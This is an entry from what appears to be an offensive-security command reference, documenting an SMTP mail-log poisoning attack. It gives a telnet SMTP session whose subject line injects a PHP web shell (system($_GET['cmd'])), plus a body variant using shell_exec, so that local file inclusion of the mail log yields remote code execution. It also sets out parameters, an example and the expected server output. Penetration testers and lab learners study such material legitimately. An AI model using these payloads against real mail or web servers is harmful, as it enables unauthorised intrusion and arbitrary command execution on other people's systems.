---
id: 58858f77-85e5-45bc-8dda-4590a6d5c41a
name: telnet-smtp-php-injection
type: command
executor: bash
data: |-
  telnet $_TARGET_HOST 25
  HELO $_ATTACKER_HOST
  MAIL FROM: <attacker@example.com>
  RCPT TO: <root@$_TARGET_HOST>
  DATA
  Subject: <?php system($_GET["cmd"]); ?>
  .
  QUIT
output: null
created_at: '2023-04-06T03:55:58.607056+00:00'
updated_at: '2023-10-10T20:22:15.234874+00:00'
platforms:
  - Linux
tags:
  - smtp
  - injection
  - rce
verified: true
validated: true
---

# telnet-smtp-php-injection

## Command

```bash
telnet $_TARGET_HOST 25
HELO $_ATTACKER_HOST
MAIL FROM: <attacker@example.com>
RCPT TO: <root@$_TARGET_HOST>
DATA
Subject: <?php system($_GET["cmd"]); ?>
.
QUIT
```

## Description

This interactive telnet command connects to the target's SMTP server on port 25 and sends an email with PHP code injected into the subject line, poisoning the mail log for later LFI exploitation to achieve RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_HOST | IP of the target SMTP server (e.g., 10.10.10.10) | Yes |
| $_ATTACKER_HOST | Your hostname or IP for HELO (e.g., attacker.com) | Yes |
| <attacker@example.com> | Sender email (spoofed) | Yes |
| <root@$_TARGET_HOST> | Recipient (local user to trigger logging) | Yes |
| Subject: <?php system($_GET["cmd"]); ?> | PHP payload in subject; customize for desired shell | Yes |
| . | Ends DATA section | Yes |

## Examples

### Basic Usage

```bash
telnet 10.10.10.10 25
HELO kali
MAIL FROM: <test@example.com>
RCPT TO: <root@10.10.10.10>
DATA
Subject: <?php system('id'); ?>
.
QUIT
```

### Advanced with Body Injection

Add body content before the dot: DATA
Body: <?php echo shell_exec($_GET['cmd']); ?>
.

## Expected Output

Telnet session responses like:

```
Trying 10.10.10.10...
Connected to 10.10.10.10.
Escape character is '^]'.
220 target ESMTP Postfix
250 target
250 2.1.0 Ok
250 2.1.5 Ok
354 End data with <CR><LF>.<CR><LF>
250 2.0.0 Ok: queued as ABC123
221 2.0.0 Bye
```
Success: No relay denied errors; verify via LFI showing PHP in log.

## Related

- [[procedures/LFI-to-RCE-via-Mail-Log-File-Inclusion]]
- [[commands/curl-lfi-access-mail-log]]
